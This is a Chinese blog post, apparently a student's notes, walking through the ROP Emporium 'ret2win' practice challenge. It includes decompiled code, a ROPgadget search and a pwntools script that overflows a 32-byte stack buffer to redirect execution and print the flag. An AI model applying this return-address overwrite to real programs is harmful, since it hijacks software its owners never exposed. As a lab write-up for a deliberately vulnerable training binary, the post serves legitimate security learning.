---
title: rope
description: 关于ROP Emporium的一些总结
date: 2026-05-07 22:17:50
updated: 2026-05-07 22:17:50
image: # 封面图推荐 2:1，不含与标题重复的文字
categories: [技术]
tags: [学习]
---

## 从rope说起

贴上链接

::link-card
---
title: ROP Emporium
icon: https://ropemporium.com/favicon/favicon.ico
link: https://ropemporium.com/
class: gradient-card active
---
::

## ret2win
用ida打开附件，函数pwnme，看关键两行
```c
_BYTE s[32]；
read(0, s, 56u);
```
确定是栈溢出，函数ret2win--0x400756->伪代码:
```c
int ret2win()
{
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}
```
执行ret2win函数会返回flag，需要用到ret作为跳板从而使我们的ret2win函数得到正常执行。ret是一条汇编指令，意思是：从栈顶取出一个地址，跳过去执行。ROPgadget找到需要的ret
```bash
ROPgadget --binary ret2win || grep ret
### 0x000000000040053e : ret
```
写payload
```python
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
elf = ELF('./ret2win')
# 静态的ELF对象，可以访问符号表中的值
io = process('./ret2win')
# 加载程序的进程
ret = 0x40053e
payload = b'1'*40 + p64(ret) + p64(0x400756)
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```
原理大概是这样的：read() 把这串数据写进栈里，覆盖掉了返回地址。当 pwnme() 执行完 ret 时，它不会回正常位置，而是跳到我们伪造的地址。
栈可以想象成这样，越下面越后面被取到：
```
[ 1 * 40           ]
[ 0x40053e         ]  <- ret
[ 0x400756         ]  <- "ret2win"
```
执行过程是这样:pwnme结束，执行自己的 ret ,这时它会从栈顶取出一个地址跳过去，也就是：跳到 0x40053e ,也就是那个单独的 ret。执行 0x40053e: ret ,这条 ret 什么都不干，只是再从栈顶取下一个地址继续跳：也就是0x400756，执行ret2win，得到flag：
```bash
ROPE{a_placeholder_32byte_flag!}
```